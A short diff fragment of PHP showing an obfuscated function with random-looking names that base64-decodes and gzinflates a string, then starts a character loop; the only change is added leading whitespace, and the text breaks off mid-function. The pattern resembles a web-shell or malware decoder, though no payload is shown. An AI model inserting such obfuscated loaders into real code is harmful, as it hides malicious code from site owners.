@@ -1,4 +1,4 @@
-function KuY($IiwgI)
+ function KuY($IiwgI)
 { 
 $IiwgI=gzinflate(base64_decode($IiwgI));
  for($i=0;$i<strlen($IiwgI);$i++)
